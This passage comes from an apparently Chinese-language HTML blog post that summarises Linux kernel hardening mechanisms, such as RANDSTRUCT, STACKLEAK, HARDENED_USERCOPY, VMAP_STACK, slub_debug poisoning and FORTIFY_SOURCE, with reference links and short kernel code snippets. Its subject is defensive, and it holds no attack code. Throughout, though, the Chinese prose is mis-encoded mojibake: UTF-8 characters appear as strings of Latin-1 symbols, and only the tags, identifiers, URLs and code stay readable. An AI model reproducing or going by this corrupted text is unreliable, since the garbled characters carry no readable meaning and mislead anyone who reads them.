äº†ARMï¼ŒIntelçš„ç¡¬ä»¶é˜²æŠ¤ï¼Œclangçš„CFIï¼ŒPAX_RAPã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä¼šæŒ‰ç…§æ–°å›¾çš„é¡ºåºæ¥è®²è§£ã€‚</p><img src="/2021/04/28/linux-kernel-security-summary/1.jpg"><p>è¿™ä¸ªåœ°å›¾æŠŠLinuxå†…æ ¸çš„é˜²å¾¡ç›¸å…³å†…å®¹åˆ’åˆ†æˆäº†å…«ç§ä¸åŒçš„ç±»åˆ«ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹ï¼š</p><ul><li>ç»¿è‰²æ ‡è®°ï¼šLinuxå†…æ ¸çš„ä¸»çº¿é˜²å¾¡</li><li>ç™½è‰²æ ‡è®°ï¼šé€šç”¨é˜²å¾¡æŠ€æœ¯</li><li>æ·±è“è‰²æ ‡è®°ï¼šä¸»çº¿ä¸æ”¯æŒçš„é˜²å¾¡</li><li>ç´«è‰²æ ‡è®°ï¼šbugæ£€æµ‹</li><li>ç°è‰²æ ‡è®°ï¼šå•†ç”¨é˜²å¾¡</li><li>ç²‰è‰²æ ‡è®°ï¼šæ¼æ´</li><li>æµ…è“è‰²æ ‡è®°ï¼šç¡¬ä»¶é˜²å¾¡</li><li>é»„è‰²æ ‡è®°ï¼šåˆ©ç”¨æŠ€æœ¯</li></ul><p>é˜²å¾¡æ–¹é¢ä¼šæ€»ç»“Linuxçš„ä¸»çº¿é˜²å¾¡ï¼Œå•†ç”¨é˜²å¾¡å’Œç¡¬ä»¶é˜²å¾¡ï¼Œä¸»çº¿ä¸æ”¯æŒçš„é˜²å¾¡å°†ä¸ä¼šå‡ºç°ã€‚</p><h2 id="é˜²å¾¡æŠ€æœ¯"><a href="#é˜²å¾¡æŠ€æœ¯" class="headerlink" title="é˜²å¾¡æŠ€æœ¯"></a>é˜²å¾¡æŠ€æœ¯</h2><h3 id="RANDSTRUCT"><a href="#RANDSTRUCT" class="headerlink" title="RANDSTRUCT"></a>RANDSTRUCT</h3><p>å®ƒæ˜¯ä½œä¸ºä¸€ä¸ªGCCçš„æ’ä»¶ï¼Œèƒ½å¤ŸéšæœºåŒ–Cå†™çš„ç»“æ„ä½“å¸ƒå±€ï¼Œè¿™ä¸ªé€‰é¡¹å¼€å¯çš„æ—¶å€™ä¼šæŠŠå†…æ ¸ä¸­çš„ç»“æ„ä½“å­—æ®µé‡æ–°æ’åˆ—ã€‚è¿™ä¸ªé‡æ–°æ’åˆ—çš„è¿‡ç¨‹å‘ç”Ÿåœ¨ç¼–è¯‘æœŸé—´ï¼Œæ’ä»¶ä¼šè·å¾—ä¸€ä¸ªéšæœºç§å­ï¼Œæ ¹æ®è¿™ä¸ªæ¥é‡æ–°æ’åˆ—ç»“æ„ä½“å­—æ®µï¼Œä½¿å¾—æ”»å‡»è€…æ— æ³•ç²¾ç¡®çŸ¥é“ç»“æ„ä½“å¯¹åº”ä½ç½®çš„å­—æ®µã€‚å› æ­¤ï¼Œæé«˜äº†æ¼æ´åˆ©ç”¨çš„éš¾åº¦ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/722293/" target="_blank" rel="noopener">https://lwn.net/Articles/722293/</a></p><h3 id="LATENT-ENTROPY"><a href="#LATENT-ENTROPY" class="headerlink" title="LATENT_ENTROPY"></a>LATENT_ENTROPY</h3><p>GCCçš„æ’ä»¶ä¹‹ä¸€ï¼Œè¿™ä¸ªæ’ä»¶ä¸ºäº†ç¼“è§£å†…æ ¸åœ¨å¯åŠ¨å’Œå¯åŠ¨ä¹‹åç”ŸæˆåŠ å¯†å¯†é’¥çš„ç†µå¤ªå°‘çš„é—®é¢˜ã€‚è¿™ä¸ªæ’ä»¶ä¼šæŠŠéšæœºå€¼æ··å…¥åˆ°æœ‰<code>__latent_entropy</code>å±æ€§æ ‡è®°çš„å‡½æ•°ä¸­çš„<code>latent_entropy</code>å…¨å±€å˜é‡ä¸­ã€‚è¿™ä¸ªå…¨å±€å˜é‡çš„å€¼ä¼šè¢«åŠ å…¥åˆ°å†…æ ¸ç†µæ± ä¸­ç”¨æ¥å¢åŠ ç†µã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/688492/" target="_blank" rel="noopener">https://lwn.net/Articles/688492/</a></p><h3 id="PAX-RANDKSTACK"><a href="#PAX-RANDKSTACK" class="headerlink" title="PAX_RANDKSTACK"></a>PAX_RANDKSTACK</h3><p>ç”±PaX Teamå®ç°çš„<code>PAX_RANDKSTACK</code>æ˜¯é’ˆå¯¹è¿›ç¨‹å†…æ ¸æ ˆçš„éšæœºåŒ–ã€‚ç”±äºå†…æ ¸æ ˆæœ¬èº«çš„å®ç°ï¼Œå†…æ ¸ä¸­æ˜¯å¯ä»¥ä»»æ„è®¿é—®æ²¡æœ‰ä»»ä½•é˜²æŠ¤çš„ã€‚éšæœºåŒ–å¯¹æ ˆå¸ƒå±€çš„æ‰“ä¹±ï¼Œé…åˆå†…æ ¸æ ˆä¿¡æ¯çš„æ“¦é™¤ï¼Œèƒ½å¤Ÿæœ‰æ•ˆé˜²æ­¢å†…æ ¸ä¿¡æ¯æ³„æ¼ï¼Œä¸å®¹æ˜“çŒœé€å†…å­˜çš„å¸ƒå±€ã€‚</p><p>å®ç°æ€»ç»“ï¼š</p><ol><li>pax_randomize_kstackçš„å®ç°ã€‚è¿™ä¸ªå‡½æ•°è¯»å–æ—¶é’Ÿï¼ˆéšæœºæ•°ï¼‰å¯¹è¿›ç¨‹å†…æ ¸æ ˆåŸºå€è¿›è¡Œæ©ç å¼‚æˆ–ï¼Œè·å–æœ‰éšæœºåŒ–åç§»çš„æ ˆåŸºå€ï¼Œèµ‹å€¼ç»™ç›¸åº”çš„å†…æ ¸ç»“æ„ï¼Œæ ˆå¢é•¿æ—¶å°±ä¼šåŸºäºè¿™ä¸ªéšæœºåŒ–åœ°å€ã€‚</li><li>åœ¨ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨å…¥å£å¤„æ’å…¥éšæœºåŒ–çš„å‡½æ•°ã€‚å› ä¸ºè¿›ç¨‹å…§æ ¸æ ˆçš„ä½¿ç”¨æ˜¯é€šè¿‡è¿›ç¨‹è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼ˆå½“ç„¶è¿˜æœ‰å¼‚å¸¸å’Œä¸­æ–­ï¼‰ï¼Œé™·è¿›å†…æ ¸ï¼Œæ¥åˆ‡æ¢åˆ°è¿›ç¨‹å†…æ ¸æ ˆï¼ŒéšæœºåŒ–åº”è¯¥åœ¨è¿™äº›åœ°æ–¹æ’å…¥æ‰§è¡Œã€‚è€Œå®ƒæ”¾ç½®çš„ä½ç½®æ˜¯åœ¨ç³»ç»Ÿè°ƒç”¨è¿”å›ä¹‹å‰ã€‚</li><li>é…åˆæ€§åœ°ï¼ŒPaX å®ç°äº† pax_erase_kstack å‡½æ•°ï¼Œåœ¨å†…æ ¸/ç”¨æˆ·ç©ºé—´åˆ‡æ¢çš„æ—¶å€™è¿›è¡Œå†…æ ¸ä¿¡æ¯æŠ¹é™¤ï¼Œå¡«å……ã€‚</li></ol><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_RANDKSTACK.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_RANDKSTACK.md</a></p><h3 id="ro-after-init"><a href="#ro-after-init" class="headerlink" title="__ro_after_init"></a>__ro_after_init</h3><p>ä¸ºäº†å‡å°‘å†…æ ¸ä¸­çš„æ”»å‡»é¢ï¼Œä¼šæ ‡è®°å†…æ ¸çš„ä¸€éƒ¨åˆ†ä¸ºåªè¯»å†…å®¹ã€‚å†…æ ¸åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ä¼šå†™å…¥ä¸€äº›å†…å®¹ï¼Œä½†åœ¨åˆå§‹åŒ–ä¹‹åè¿™éƒ¨åˆ†å†…å®¹ç¡®å®šä¸ºåªè¯»ä½œç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨constï¼Œå› ä¸ºå®é™…ä¸Šå®ƒæ˜¯æœ‰å†™å…¥ä¿®æ”¹çš„ï¼Œæ‰€ä»¥å°±è¯ç”Ÿäº†<code>__ro_after_init</code>ã€‚å®ƒä¼šåœ¨å†…æ ¸åˆå§‹åŒ–å®Œæˆä¹‹åæŠŠè¿™äº›å†…å­˜åŒºåŸŸæ ‡è®°ä¸ºåªè¯»ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/676145/" target="_blank" rel="noopener">https://lwn.net/Articles/676145/</a></p><h3 id="PAX-CONSTIFY-PLUGIN"><a href="#PAX-CONSTIFY-PLUGIN" class="headerlink" title="PAX_CONSTIFY_PLUGIN"></a>PAX_CONSTIFY_PLUGIN</h3><p>ä¸ºäº†ç¼“è§£ä¿®æ”¹å‡½æ•°æŒ‡é’ˆåŠ«æŒæ§åˆ¶æµçš„æ”»å‡»æ–¹å¼è€Œæ¨å‡ºçš„GCCæ’ä»¶ã€‚å®ƒä¼šä½¿å¾—æ‰€æœ‰çš„å‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“éƒ½å˜ä¸ºåªè¯»ã€‚</p><p>å‚è€ƒï¼š<a href="https://isopenbsdsecu.re/mitigations/missing_features/" target="_blank" rel="noopener">https://isopenbsdsecu.re/mitigations/missing_features/</a></p><h3 id="PAX-SIZE-OVERFLOW"><a href="#PAX-SIZE-OVERFLOW" class="headerlink" title="PAX_SIZE_OVERFLOW"></a>PAX_SIZE_OVERFLOW</h3><p>ç”¨äºæ£€æµ‹æº¢å‡ºç”¨çš„GCCæ’ä»¶ï¼Œå®ƒä¼šç”¨doubleç±»å‹å¤§å°çš„æ•°æ®ç»“æ„æ¥ä¿å­˜sizeè¡¨è¾¾å¼çš„è®¡ç®—ç»“æœï¼Œç„¶åæ‹¿è¿™ä¸ªç»“æœå’Œå®é™…çš„è¾“å‡ºå¤§å°ä½œæ¯”è¾ƒï¼Œä»¥æ­¤æ¥æ£€æŸ¥æº¢å‡ºçš„æƒ…å†µã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªæ£€æµ‹ä¸ä¼šé’ˆå¯¹æ•´ä¸ªæºç ï¼Œåªä¼šå¯¹ä¸€äº›ç‰¹å®šçš„åœ°æ–¹åšæ£€æŸ¥ï¼Œæ¯”å¦‚å†…å­˜åˆ†é…çš„æ—¶å€™é”™è¯¯çš„å¤§å°å¯¼è‡´çš„ç¼“å†²åŒºæº¢å‡ºã€‚ä¹Ÿå¯ä»¥å¯¹ä¸€äº›åœ°æ–¹åšæ ‡è®°ï¼Œè·³è¿‡å¯¹å®ƒä»¬çš„æº¢å‡ºæ£€æŸ¥ã€‚</p><p>å‚è€ƒï¼š<a href="https://ir.library.oregonstate.edu/downloads/zp38wj554" target="_blank" rel="noopener">https://ir.library.oregonstate.edu/downloads/zp38wj554</a></p><h3 id="REFCOUNT-FULL"><a href="#REFCOUNT-FULL" class="headerlink" title="REFCOUNT_FULL"></a>REFCOUNT_FULL</h3><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªé’ˆå¯¹å¼•ç”¨è®¡æ•°çš„æº¢å‡ºä¿æŠ¤ï¼Œåœ¨å¯¹å¼•ç”¨è®¡æ•°æ“ä½œçš„å‡½æ•°ä¸­æ·»åŠ æŒ‡ä»¤æ£€æµ‹refcountæ˜¯å¦ä¸ºè´Ÿã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªä¿æŠ¤ï¼Œå†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°ä¸æ–­å¢åŠ ï¼Œå½“å‘ç”Ÿæº¢å‡ºæ—¶ï¼Œå¼•ç”¨è®¡æ•°ä¸ºè´Ÿæ•°ï¼Œå†…å­˜å³å¯è¢«é‡Šæ”¾ï¼Œè€Œæ­¤æ—¶ç¨‹åºè¿˜æœ‰å¯¹è¯¥æŒ‡é’ˆæ‰€å€¼å†…å­˜çš„å¼•ç”¨ï¼Œå°±æœ‰å¯èƒ½å‘ç”Ÿ<code>use after free</code>ï¼Œå¯ä»¥ç”¨åšæ”»å‡»åˆ©ç”¨ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/728626/" target="_blank" rel="noopener">https://lwn.net/Articles/728626/</a></p><p>ç±»ä¼¼çš„ä¿æŠ¤<code>PAX_REFCOUNT</code></p><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_REFCOUNT.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_REFCOUNT.md</a></p><h3 id="TIF-FSCHECK-flag"><a href="#TIF-FSCHECK-flag" class="headerlink" title="TIF_FSCHECK flag"></a>TIF_FSCHECK flag</h3><p>ä¸€äº›æ‰§è¡Œè·¯å¾„ä¼šä¸´æ—¶å‡é«˜<code>addr_limit</code>ï¼Œä¸ºäº†å†…æ ¸ä»£ç èƒ½å¤Ÿåƒè¯»å†™ç”¨æˆ·å†…å­˜ä¸€æ ·è¯»å†™å†…æ ¸å†…å­˜ï¼Œä½†å¦‚æœå°±è¿™æ ·è¿”å›åˆ°ç”¨æˆ·æ€ï¼Œé‚£ä¹ˆåœ¨ç”¨æˆ·æ€å°±å¯ä»¥è¯»å†™åˆ°å†…æ ¸å†…å­˜ï¼Œæ‰€ä»¥è¿™ä¸ªæ ‡å¿—ä½ä¼šåœ¨è¿”å›ç”¨æˆ·æ€æ—¶æ£€æŸ¥<code>addr_limit</code>çš„å€¼ã€‚å¯¹ä»»ä½•è°ƒç”¨äº†<code>set_fs()</code>éƒ½ä¼šè®¾ç½®çº¿ç¨‹æ ‡è®°<code>TIF_FSCHECK</code>ã€‚</p><p>å‚è€ƒï¼š<a href="https://patchwork.kernel.org/project/kernel-hardening/patch/20180514130316.23855-2-mpe@ellerman.id.au/" target="_blank" rel="noopener">https://patchwork.kernel.org/project/kernel-hardening/patch/20180514130316.23855-2-mpe@ellerman.id.au/</a></p><h3 id="SCHED-STACK-END-CHECK"><a href="#SCHED-STACK-END-CHECK" class="headerlink" title="SCHED_STACK_END_CHECK"></a>SCHED_STACK_END_CHECK</h3><p>è¿™ä¸ªé€‰é¡¹æ˜¯ä¸ºäº†æ£€æŸ¥åœ¨è°ƒç”¨<code>schedule()</code>æ—¶çš„æ ˆæº¢å‡ºæƒ…å†µã€‚å¦‚æœæ ˆç»“æŸçš„ä½ç½®å‘ç°è¢«è¦†ç›–ï¼Œé‚£ä¹ˆè¿™äº›è¢«è¦†ç›–åŒºåŸŸçš„å†…å®¹æ˜¯ä¸å¯ä¿¡çš„ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿ä¸ä¼šå‘ç”Ÿé”™è¯¯è¡Œä¸ºï¼Œè¢«è¦†ç›–åŒºåŸŸå¦‚æœæ‰§è¡Œå¯èƒ½ä¼šåœ¨åç»­é˜¶æ®µå‡ºç°æ•°æ®æŸåæˆ–å´©æºƒã€‚è¿™ä¸ªæ£€æŸ¥çš„è¿è¡Œæ—¶å¼€é”€å¾ˆå°ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/SCHED_STACK_END_CHECK.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/SCHED_STACK_END_CHECK.html</a></p><h3 id="GRKERNSEC-KSTACKOVERFLOW"><a href="#GRKERNSEC-KSTACKOVERFLOW" class="headerlink" title="GRKERNSEC_KSTACKOVERFLOW"></a>GRKERNSEC_KSTACKOVERFLOW</h3><p>Grsecurity çš„ KSTACKOVERFLOW ç‰¹æ€§æ˜¯é’ˆå¯¹è¿›ç¨‹å†…æ ¸æ ˆæº¢å‡ºçš„ä¸€äº›åŠ å›ºæªæ–½ï¼Œä¸»è¦åŒ…æ‹¬ï¼š</p><ul><li>è¿›ç¨‹å†…æ ¸æ ˆåˆå§‹åŒ–æ—¶çš„<code>vmap</code>ä¸ <code>thread_info</code>çš„åˆ†ç¦»</li><li><code>double_fault</code> ä¸­ <code>Guard page</code> çš„æ£€æµ‹</li><li>ä¸€äº›æŒ‡é’ˆçš„æ£€æŸ¥</li><li>ä¸€äº›é…åˆæ€§çš„åˆå§‹åŒ–</li></ul><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/KSTACKOVERFLOW.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/KSTACKOVERFLOW.md</a></p><p>ä»¥ä¸‹æ˜¯å¦å¤–ä¸¤ä¸ªç›¸å…³çš„é˜²å¾¡æœºåˆ¶</p><h4 id="VMAP-STACK"><a href="#VMAP-STACK" class="headerlink" title="VMAP_STACK"></a>VMAP_STACK</h4><p>è¿™ä¸ªæœºåˆ¶æ˜¯é‡‡ç”¨vmallocç”³è¯·çš„å†…å­˜ä½œä¸ºå†…æ ¸æ ˆï¼Œè¿™æ ·å¯ä»¥åˆ©ç”¨vmallocè‡ªå¸¦çš„<code>guard page</code>å¢å¼ºæ ˆæº¢å‡ºæ£€æµ‹èƒ½åŠ›ï¼ŒåŒæ—¶è¿™äº›ç”³è¯·çš„å†…å­˜ç©ºé—´åœ¨ç‰©ç†ä¸Šå¯èƒ½æ˜¯ä¸è¿ç»­çš„ï¼Œèƒ½å¤Ÿå‡å°‘å†…å­˜çš„ç¢ç‰‡åŒ–ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/rikeyone/article/details/105971720" target="_blank" rel="noopener">https://blog.csdn.net/rikeyone/article/details/105971720</a></p><h4 id="THREAD-INFO-IN-TASK"><a href="#THREAD-INFO-IN-TASK" class="headerlink" title="THREAD_INFO_IN_TASK"></a>THREAD_INFO_IN_TASK</h4><p>è¿™ä¸ªé€‰é¡¹å¼€å¯çš„æ—¶å€™ä¼šæŠŠ<code>thread_info</code>æ”¾å…¥åˆ°<code>task_struct</code>ä¸­ï¼Œåœ¨åŸæ¥çš„ç»“æ„ä¸­<code>task_struct</code>å’Œ<code>thread_info</code>æ˜¯åˆ†å¼€çš„ï¼Œè¿™ä¸ª<code>thread_info</code>ä½äºçº¿ç¨‹æ ˆçš„æœ€ä½åœ°å€å¤„ï¼Œä½†åˆæ¯”<code>task_struct</code>åœ°å€é«˜ï¼Œæ‰€ä»¥å¦‚æœå‘ç”Ÿæº¢å‡ºä¼šä½¿å¾—<code>thread_info</code>çš„æ•°æ®ç»“æ„è¢«ç ´åï¼Œä¸ä¼šè¢«åˆ¤æ–­ä¸ºæ ˆæº¢å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_ARCH_TASK_STRUCT_ON_STACK</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">task</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/84591715" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/84591715</a></p><h3 id="HARDENED-USERCOPY"><a href="#HARDENED-USERCOPY" class="headerlink" title="HARDENED_USERCOPY"></a>HARDENED_USERCOPY</h3><p>è¿™ä¸ªå®‰å…¨æœºåˆ¶æ˜¯ä»<code>PAX_USERCOPY</code>ä¸­å€Ÿé‰´å­¦ä¹ çš„ã€‚Linuxå†…æ ¸çš„è®¾è®¡ä¸­ï¼Œå†…æ ¸åœ°å€ç©ºé—´å’Œç”¨æˆ·åœ°å€ç©ºé—´æ˜¯éš”ç¦»çš„ï¼Œä¸èƒ½ç›´æ¥é€è¿‡åœ°å€å»è®¿é—®å†…å­˜ã€‚å› æ­¤ï¼Œå½“éœ€è¦å‘ç”Ÿç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´è¿›è¡Œæ•°æ®äº¤æ¢æ—¶ï¼Œéœ€è¦å°†æ•°æ®æ‹·è´ä¸€ä»½åˆ°å¦ä¸€ä¸ªçš„å†…å­˜ç©ºé—´ä¸­ã€‚åœ¨å†…æ ¸ä¸­ copy_from_user å’Œ copy_to_user è¿™ç»„å‡½æ•°æ‰¿æ‹…äº†æ•°æ®åœ¨å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´æ‹·è´çš„ä»»åŠ¡ã€‚è¿™å°±å¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´çš„æ•°æ®é•¿åº¦è¶…è¿‡å†…æ ¸çš„ç¼“å†²åŒºé•¿åº¦ï¼Œå°±ä¼šäº§ç”Ÿæº¢å‡ºç ´åå†…æ ¸çš„ç©ºé—´æ•°æ®å¯¼è‡´æœ‰æ¼æ´åˆ©ç”¨çš„å¯èƒ½ã€‚<code>HARDENED_USERCOPY</code>åœ¨è¿™ç»„å‡½æ•°ä¸­å®ç°äº†å¯¹ç¼“å†²åŒºé•¿åº¦çš„æ£€æŸ¥ï¼Œå½“é•¿åº¦æ£€æŸ¥å‘ç°æœ‰æº¢å‡ºçš„å¯èƒ½æ—¶ï¼Œå°±ä¸ä¼šæ‰§è¡Œæ•°æ®çš„å¤åˆ¶ï¼Œé˜²æ­¢éæ³•æ‹·è´è¦†ç›–å†…å­˜ï¼Œç ´åæ ˆå¸§æˆ–å †ã€‚</p><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_USERCOPY.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_USERCOPY.md</a></p><h3 id="STACKLEAK"><a href="#STACKLEAK" class="headerlink" title="STACKLEAK"></a>STACKLEAK</h3><p>è¿™ä¸ªæœºåˆ¶çš„å‡ºç°æ—¶ä¸ºäº†ç¼“è§£å†…æ ¸æ ˆçš„æº¢å‡ºå’Œæ³„éœ²ç±»å‹çš„æ¼æ´ã€‚ä¸»è¦ä½œç”¨ï¼š</p><ul><li>å‡å°‘å†…æ ¸æ ˆä¿¡æ¯æ³„éœ²æ¼æ´èƒ½æ³„éœ²çš„ä¿¡æ¯</li><li>é˜»æ­¢ä¸€äº›æœªåˆå§‹åŒ–æ ˆå˜é‡æ”»å‡»</li><li>æ£€æµ‹è¿›ç¨‹å†…æ ¸æ ˆçš„æº¢å‡º</li></ul><p>æ•´ä½“çš„å®ç°æ–¹æ³•å€Ÿé‰´äº†<code>PAX_MEMORY_STACKLEAK</code>ï¼Œä¸€ä¸ªæ˜¯å®ç°äº†å†è¿›å‡ºå†…æ ¸ç©ºé—´æ—¶å¯¹è¿›ç¨‹å†…æ ¸æ ˆçš„æ•°æ®è¿›è¡Œæ“¦é™¤ï¼Œè¿™æ ·å°±ç®—æœ‰æ³„éœ²ä¿¡æ¯çš„æ¼æ´ä¹Ÿåªèƒ½å¾—åˆ°æ— æ•ˆæ•°æ®ï¼›å¦å¤–ä¸€ä¸ªç”¨äºæ£€æµ‹æ ˆæº¢å‡ºçš„åŠŸèƒ½å¯ä»¥ä¸<code>VMAP_STACK</code>å’Œ<code>THREAD_INFO_IN_TASK</code>æ­é…ã€‚</p><p>å‚è€ƒï¼š<a href="https://a13xp0p0v.github.io/2018/11/04/stackleak.htmlã€https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/MEMORY_LEAK.md" target="_blank" rel="noopener">https://a13xp0p0v.github.io/2018/11/04/stackleak.htmlã€https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/MEMORY_LEAK.md</a></p><h3 id="slub-debug"><a href="#slub-debug" class="headerlink" title="slub_debug"></a>slub_debug</h3><img src="/2021/04/28/linux-kernel-security-summary/2.png"><h4 id="Zï¼ˆRed-Zoneï¼‰"><a href="#Zï¼ˆRed-Zoneï¼‰" class="headerlink" title="Zï¼ˆRed Zoneï¼‰"></a>Zï¼ˆRed Zoneï¼‰</h4><p>Red zoneå‡ºç°åœ¨å†…å­˜åˆ†é…å¯¹è±¡çš„åé¢ï¼Œä»¥åŠåä¸€ä¸ªå¯¹è±¡çš„å‰é¢ï¼Œç”¨äºæ£€æµ‹è¶Šç•Œè®¿é—®çš„é—®é¢˜ï¼Œåœ¨è¿™é‡Œé¢ä¼šå¡«å……<code>magic num</code>ï¼Œä¹‹åæ£€æµ‹Red zoneåŒºåŸŸæ•°æ®å°±èƒ½å¤Ÿåˆ¤æ–­æ˜¯å¦å‘ç”Ÿæº¢å‡ºã€‚</p><h4 id="Fï¼ˆfreeï¼‰"><a href="#Fï¼ˆfreeï¼‰" class="headerlink" title="Fï¼ˆfreeï¼‰"></a>Fï¼ˆfreeï¼‰</h4><p>æ¿€æ´»å®Œæ•´æ€§æ£€æŸ¥åŠŸèƒ½ï¼Œåœ¨ç‰¹å®šçš„ç¯èŠ‚æ¯”å¦‚freeçš„æ—¶å€™å¢åŠ å„ç§æ¡ä»¶åˆ¤æ–­ï¼ŒéªŒè¯æ•°æ®æ˜¯å¦å®Œå¥½ã€‚å¯ä»¥ç”¨æ¥æ£€æµ‹å¤šæ¬¡freeçš„æƒ…å†µã€‚</p><h4 id="Pï¼ˆPosionï¼‰"><a href="#Pï¼ˆPosionï¼‰" class="headerlink" title="Pï¼ˆPosionï¼‰"></a>Pï¼ˆPosionï¼‰</h4><p>å½“å¯¹è±¡è¢«æ–°åˆ†é…çš„æ—¶å€™å›è¢«å¡«å……ç‰¹æ®Šçš„<code>magic num 0x5a</code>ï¼Œè¿™æ—¶å‡ºç°å¯¹è±¡ä½¿ç”¨å°±ä¼šè§¦å‘æœªåˆå§‹åŒ–ä½¿ç”¨çš„é”™è¯¯ï¼Œè€Œåœ¨å¯¹è±¡é‡Šæ”¾ä¹‹åä¼šè¢«å¡«å……<code>0x6b</code>ï¼Œè¿™æ—¶å¦‚æœå¯¹è±¡è¢«ä½¿ç”¨å°±ä¼šè§¦å‘<code>use after free</code>çš„æ¼æ´æ£€æµ‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POISON_INUSE         0x5a    <span class="comment">/* for use-uninitialised poisoning */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POISON_FREE          0x6b    <span class="comment">/* for use-after-free poisoning */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POISON_END           0xa5    <span class="comment">/* end-byte of poisoning */</span></span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="http://www.wowotech.net/memory_management/427.html" target="_blank" rel="noopener">http://www.wowotech.net/memory_management/427.html</a></p><h3 id="FORTIFY-SOURCE"><a href="#FORTIFY-SOURCE" class="headerlink" title="FORTIFY_SOURCE"></a>FORTIFY_SOURCE</h3><p>æ£€æŸ¥å†…å­˜æ‹·è´ç±»å‡½æ•°çš„ç›®çš„ç¼“å†²åŒºæ˜¯å¦å­˜åœ¨æº¢å‡ºã€‚æ£€æµ‹çš„å‡½æ•°åŒ…æ‹¬ï¼š<code>memcpy</code>, <code>mempcpy</code>, <code>memmove</code>, <code>memset</code>, <code>strcpy</code>,<code>stpcpy</code>, <code>strncpy</code>, <code>strcat</code>, <code>strncat</code>,<code>sprintf</code>,<code>vsprintf</code>,<code>snprintf</code>,<code>vsnprintf</code>,<code>gets</code>ã€‚</p><p>å‚è€ƒï¼š<a href="https://access.redhat.com/blogs/766093/posts/1976213" target="_blank" rel="noopener">https://access.redhat.com/blogs/766093/posts/1976213</a></p><h3 id="UBSAN-BOUNDS"><a href="#UBSAN-BOUNDS" class="headerlink" title="UBSAN_BOUNDS"></a>UBSAN_BOUNDS</h3><p>è¿™æ˜¯ä¸€ä¸ªubsançš„é…ç½®é€‰é¡¹ï¼Œç”¨äºæ‰§è¡Œæ•°ç»„æŒ‡é’ˆè¶Šç•Œçš„æ£€æŸ¥ã€‚é€‰é¡¹å¼€å¯ä¹‹åèƒ½å¤Ÿæ£€æµ‹å‡ºåœ¨ç¼–è¯‘æœŸé—´å·²çŸ¥æ•°ç»„é•¿åº¦çš„è¶Šç•Œè®¿é—®æ¼æ´ï¼Œä½†è¿™ä¸ªé€‰é¡¹ä¹Ÿæœ‰è¾ƒå¤§çš„å±€é™æ€§ï¼Œå®ƒä¸èƒ½ä¿æŠ¤å› ä¸ºå†…å­˜æ‹·è´ç±»å‡½æ•°é€ 